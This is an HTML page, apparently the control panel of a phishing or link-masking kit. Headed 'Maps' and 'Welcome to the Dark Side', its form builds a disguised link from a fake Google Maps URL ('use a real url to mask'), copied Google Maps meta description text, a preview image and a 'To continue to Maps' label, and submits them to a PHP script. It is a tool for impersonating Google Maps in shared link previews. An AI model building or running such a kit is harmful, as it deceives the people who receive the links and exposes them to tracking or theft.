<html><head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Forest Gump</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <style>
        /* Unique dark theme */
        body {
            font-family: Arial, sans-serif;
            font-size: 16px;
            color: #ffffff;
            background-color: #0f0f0f;
            padding: 20px;
        }
        #container {
            width: 90%;
            max-width: 600px;
            margin: 0 auto;
            background-color: #191919;
            padding: 20px;
            border-radius: 5px;
        }
        input[type="text"],
        textarea {
            width: 100%;
            padding: 12px;
            border: 1px solid #333333;
            border-radius: 4px;
            box-sizing: border-box;
            margin-top: 6px;
            margin-bottom: 16px;
            resize: vertical;
            color: #ffffff;
            background-color: #333333;
        }
        input[type="submit"] {
            background-color: #ff9900;
            color: #ffffff;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #ff7f00;
        }
        .error {
            color: #ff0000;
        }
        h1 {
            color: #ff9900;
            font-size: 32px;
            text-align: center;
            margin-bottom: 20px;
        }
        h2 {
            color: #ff9900;
            font-size: 24px;
            text-align: center;
            margin-bottom: 20px;
        }
        .btn {
            background-color: #333333;
            border: 1px solid #ff9900;
            color: #ff9900;
        }
        .btn:hover {
            background-color: #ff9900;
            color: #ffffff;
        }
    </style>
</head>
<body>
    <div id="container">
        <h1>Maps</h1>
        <h2>Welcome to the Dark Side</h2>
        <form id="accesspanel" action="/public/Google/meta/040144.php" method="GET">
<input type="text" name="title" id="title" placeholder="title [use a real url to mask]" value="https://www.google.ca/maps/place/city/Location=id453552354rtfwdc433w656gw5f3w6fw43" required="">
<input required="" type="text" name="description" id="description" placeholder="[metadata description]" value="Navigate your world faster and easier with Google Maps. Over 220 countries and territories mapped and hundreds of millions of businesses and places on the map. Get real-time GPS navigation, traffic, and transit info, and explore local neighborhoods by knowing where to eat, drink and go - no matter what part of the world you’re in.">
<input type="text" name="imageurl" id="imageurl" value="https://apdparts.ca/images/about/map-edmonton.jpg" placeholder="a 200x200 meta preview image url" required=""> <br>
<input type="text" name="mod" id="mod" placeholder="To continue to Maps" value="Maps" required="">  
            <button type="submit" class="btn btn-primary">Run</button>
        </form>
    </div>

</body></html>